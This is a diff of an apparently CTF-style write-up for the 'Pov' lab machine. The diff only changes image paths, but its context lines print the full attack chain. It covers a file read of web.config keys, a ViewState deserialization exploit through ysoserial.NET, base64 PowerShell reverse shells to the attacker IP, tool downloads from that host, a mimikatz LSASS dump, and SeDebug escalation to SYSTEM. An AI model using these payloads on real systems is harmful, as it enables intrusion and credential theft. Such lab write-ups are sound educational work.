@@ -99,48 +99,48 @@ dev                     [Status: 302, Size: 152, Words: 9, Lines: 2, Duration: 5
 
 Checking out the landing page shows that this site was built to host information about a company that provides cybersecurity monitoring solutions.
 
-![](../assets/img/2026-05-05-Pov/1.png)
+![](/assets/img/2026-05-05-Pov/1.png)
 
 The main page is largely static and only contains a contact form that goes to the void. The email given to reach out to is for a user named _sfitz_ which could come in handy for any login forms later on.
 
-![](../assets/img/2026-05-05-Pov/2.png)
+![](/assets/img/2026-05-05-Pov/2.png)
 
 ### Dev Subdomain
 My scans picked up a dev subdomain and after appending it to my hosts file, I head on over. This looks to be a portfolio site for the site's web developer and hovering over the contact tab reveals that its built with ASP.NET.
 
-![](../assets/img/2026-05-05-Pov/3.png)
+![](/assets/img/2026-05-05-Pov/3.png)
 
 This site's contact page does work and capturing a request in Burp Suite shows that we send data through various ASP.NET mechanisms. Submitting the contact form redirects us to the main page, so this seems to be useless for us.
 
-![](../assets/img/2026-05-05-Pov/4.png)
+![](/assets/img/2026-05-05-Pov/4.png)
 
 ## Exploitation
 
 ### File Read Vulnerability
 The site also provides a way to download Stephen's CV in PDF format via some JavaScript.
 
-![](../assets/img/2026-05-05-Pov/5.png)
+![](/assets/img/2026-05-05-Pov/5.png)
 
 Capturing a request to this link reveals a similar data body being sent to the server, however the request uses a file parameter that points towards cv.pdf and by changing it to a known file on Windows machines (such as \etc\hosts), we are able to download arbitrary files from the system. Note that the site does some filtering on path traversal characters, but using full paths works just fine.
 
-![](../assets/img/2026-05-05-Pov/6.png)
+![](/assets/img/2026-05-05-Pov/6.png)
 
 A bit of trial and error eventually rewards me with the dev site's web.config file in the standard place for Microsoft IIS servers. This leaks a few secrets like the decryption and validation keys, allowing us to forge serialized input to the webapp.
 
-![](../assets/img/2026-05-05-Pov/7.png)
+![](/assets/img/2026-05-05-Pov/7.png)
 
 ### RCE via Deserialization
 Along with this file read vulnerability, the server's response headers contain the ASP.NET version.
 
-![](../assets/img/2026-05-05-Pov/8.png)
+![](/assets/img/2026-05-05-Pov/8.png)
 
 A bit of Googling for known vulnerabilities in this version reveals that the `__VIEWSTATE` parameter, which is being sent in our request, is vulnerable to remote code execution by deserializing untrusted data.
 
-![](../assets/img/2026-05-05-Pov/9.png)
+![](/assets/img/2026-05-05-Pov/9.png)
 
 [CVE-2020–0605](https://nvd.nist.gov/vuln/detail/cve-2020-0605) explains that the .NET software fails to check the source markup of a file, allowing attackers to execute code in the context of the current user (presumably _sfitz_). A bit more digging shows that we can use the machine keys gathered from the file read vulnerability to generate a malicious payload to be passed into the `__VIEWSTATE` parameter, letting us get code execution.
 
-![](../assets/img/2026-05-05-Pov/10.png)
+![](/assets/img/2026-05-05-Pov/10.png)
 
 ### Initial Foothold
 I'll use the [ysoserial.NET](https://github.com/pwntester/ysoserial.net) tool on my Windows 10 VM for this portion of exploitation. We must use the following options to get a proper base64 payload:
@@ -158,11 +158,11 @@ PS> .\ysoserial.exe -p ViewState -g WindowsIdentity --decryptionalg="AES" --decr
 - `--path="/portfolio"` - The path for the current request which is used to calculate the `__VIEWSTATEGENERATOR` parameter, failing if it does not match
 - `-c "curl 10.10.14.243/test"` - Our command to run
 
-![](../assets/img/2026-05-05-Pov/11.png)
+![](/assets/img/2026-05-05-Pov/11.png)
 
 Supplying that base64 blob to the `__VIEWSTATE` parameter and sending it with the request to the server will deserialize and attempt to fetch a test file, confirming that this works.
 
-![](../assets/img/2026-05-05-Pov/12.png)
+![](/assets/img/2026-05-05-Pov/12.png)
 
 Now that we know command execution succeeds, I grab a PowerShell base64 payload from [revshells.com](https://www.revshells.com/) and swap out our command.
 
@@ -176,7 +176,7 @@ After setting up a Netcat listener to recieve the connection, we are granted a s
 └─$ rlwrap -cAr nc -lvnp 443
 ```
 
-![](../assets/img/2026-05-05-Pov/13.png)
+![](/assets/img/2026-05-05-Pov/13.png)
 
 Listing other users on the machine reveals one other person, besides the administrator, named _Alaading_.
 
@@ -185,7 +185,7 @@ Listing other users on the machine reveals one other person, besides the adminis
 ### PS Creds in XML Document
 Considering we don't have read permissions to anyone else's directories, I start by looking for available files in the webroot and in our home directory which reveals a _connection.xml_ file.
 
-![](../assets/img/2026-05-05-Pov/14.png)
+![](/assets/img/2026-05-05-Pov/14.png)
 
 Inside is a serialized PowerShell credential object and since we control this file, recovering the password is as simple as using the `Import-Clixml` cmdlet against the xml document. We can then convert the SecureString password into a NetworkCredential object and expose the plaintext version.
 
@@ -207,14 +207,14 @@ PS> curl http://10.10.14.243/RunasCs.exe -o RunasCs.exe
 PS> .\RunasCs.exe alaading [REDACTED] powershell -r 10.10.14.243:443
 ```
 
-![](../assets/img/2026-05-05-Pov/15.png)
+![](/assets/img/2026-05-05-Pov/15.png)
 
 At this point we can grab the user flag under their desktop folder and start looking at paths to an Administrator shell.
 
 ### Abusing SeDebug
 Listing privilege information for Alaading's account shows that we now have access to SeDebug, which permits the debugging of other processes.
 
-![](../assets/img/2026-05-05-Pov/16.png)
+![](/assets/img/2026-05-05-Pov/16.png)
 
 Referring to this [Hacktricks article](https://hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/privilege-escalation-abusing-tokens.html#sedebugprivilege) about abusing tokens, I discover that we can abuse this to dump the LSASS memory space using a tool like Mimikatz.
 
@@ -224,7 +224,7 @@ PS> > curl http://10.10.14.243/mimikatz.exe -o mimi.exe
 PS> > .\mimi.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
 ```
 
-![](../assets/img/2026-05-05-Pov/17.png)
+![](/assets/img/2026-05-05-Pov/17.png)
 
 Unfortunately, this doesn't give us any passwords or hashes for the administrator. Another way to exploit this is to use specialized tools such as the [psgetsys.ps1](https://raw.githubusercontent.com/decoder-it/psgetsystem/master/psgetsys.ps1) script or [other PoCs](https://github.com/bruno-1337/SeDebugPrivilege-Exploit) to spawn a process from a parent, allowing us to execute commands as NT AUTHORITY\SYSTEM. 
 
@@ -236,13 +236,13 @@ PS> . .\psgetsys.ps1
 PS> ImpersonateFromParentPid -ppid 548 -command "c:\windows\system32\cmd.exe" -cmdargs "powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4AMgA0ADMAIgAsADQANAA1ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA=="
 ```
 
-![](../assets/img/2026-05-05-Pov/18.png)
+![](/assets/img/2026-05-05-Pov/18.png)
 
 The script gets a handle for the ppid, however upon executing the command we're met with a **"Last error: 122"** message. A bit of digging shows that this is for an insufficient buffer size, which I thought was from the command being too long. 
 
 Another test with a curl command in place of the reverse shell also errors out with the same response.
 
-![](../assets/img/2026-05-05-Pov/19.png)
+![](/assets/img/2026-05-05-Pov/19.png)
 
 After a while of troubleshooting, I eventually look at Ippsec's walkthrough for this box who recommends port forwarding the WinRM service to our local machine in order to grab a more proper shell.
 
@@ -260,6 +260,6 @@ I'm not too sure why this resolves the issue, but running the exact same command
 PS> ImpersonateFromParentPid -ppid 548 -command "c:\windows\system32\cmd.exe" -cmdargs "/c powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4AMgA0ADMAIgAsADQANAA1ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA=="
 ```
 
-![](../assets/img/2026-05-05-Pov/20.png)
+![](/assets/img/2026-05-05-Pov/20.png)
 
 Grabbing the root flag under the Administrator's desktop folder will complete this challenge. Overall I enjoyed the deserialization attack, probably because it forced me to finally setup a Windows 10 winprep box, but it was well done. I hope this was helpful to anyone following along or stuck and happy hacking!
